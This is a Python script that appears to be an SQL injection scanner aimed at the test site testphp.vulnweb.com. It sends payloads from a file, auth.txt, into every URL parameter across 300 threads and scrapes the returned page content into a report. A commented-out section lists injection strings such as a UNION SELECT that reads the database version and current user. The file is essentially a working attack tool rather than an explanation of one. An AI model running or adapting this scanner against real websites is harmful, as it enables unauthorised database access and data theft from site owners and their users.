from concurrent.futures import ThreadPoolExecutor
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
import urllib.parse

target_url = 'http://testphp.vulnweb.com/listproducts.php?artist=2'

objectss = "id"
# objectss = "class"
relevantportion = "content"

parsed_url = urlparse(target_url)
params = parse_qs(parsed_url.query)
scheme = parsed_url.scheme
url = parsed_url.netloc
url = f'{scheme}://{url}'

if not params:
    print("No parameters found in the URL.")
    exit()

print(f"Scanning Started at this URL => {url}")

# payloads = [
#     '-1 union select 1,version(),current_user()',
#     '1=1',
#     'or 1=1',
#     'this',
#     'or 1=1--',
#     'or or 1=1#',
# ]

# for param in params.keys():
#     for payload in payloads:
#         modified_params = {}
#         for param2 in params.keys():
#             modified_params[param2] = [payload]
#         modified_url = target_url.split('?')[0] + '?' + '&'.join([f'{k}={v[0]}' for k, v in modified_params.items()])
#         response = requests.get(modified_url)
#         if 'Warning' in response.text:
#             print("===================================================================================================")
#             print(f'Maybe VurlnableURL =  {modified_url}')
#             if objectss == 'id':
#                 soup = BeautifulSoup(response.text, 'html.parser')
#                 relevant_portion = soup.find("div", {"id": f"{relevantportion}"})
#                 if relevant_portion:
#                     print(f"Found Data = {relevant_portion.text}")
#             else:
#                 soup = BeautifulSoup(response.text, 'html.parser')
#                 relevant_portion = soup.find("div", {"class": f"{relevantportion}"})
#                 if relevant_portion:
#                     print(f"Found Data = {relevant_portion.text}")

with open('report.txt', 'w') as a:
    a.write("")

def check_url(param, payload):
    payload = urllib.parse.quote(payload)
    modified_params = {param: [payload]}
    modified_url = target_url.split('?')[0] + '?' + '&'.join([f'{k}={v[0]}' for k, v in modified_params.items()])
    response = requests.get(modified_url)

    # if not 'Warning' in response.text or not 'Error' in response.text:
    if response.text:
        print("===================================================================================================")
        print(f'Maybe Vulnerable URL =  {modified_url}')
        soup = BeautifulSoup(response.text, 'html.parser')

        if objectss == 'id':
            relevant_portion = soup.find("div", {"id": f"{relevantportion}"})
        else:
            relevant_portion = soup.find("div", {"class": f"{relevantportion}"})

        if relevant_portion:
             if relevant_portion and 'Warning' not in relevant_portion.text \
            and 'Error' not in relevant_portion.text \
            and relevant_portion.text.strip():
                print(f"Found Data = {relevant_portion.text}")
                with open('report.txt', 'a') as a:
                    a.write(f'{modified_url}\nFound Data = {relevant_portion.text}\n===================================================================================================\n')


with open('auth.txt') as toka:
    payloads = toka.read().splitlines()

with ThreadPoolExecutor(300) as executor:
    for param in params.keys():
        for payload in payloads:
            executor.submit(check_url, param, payload)
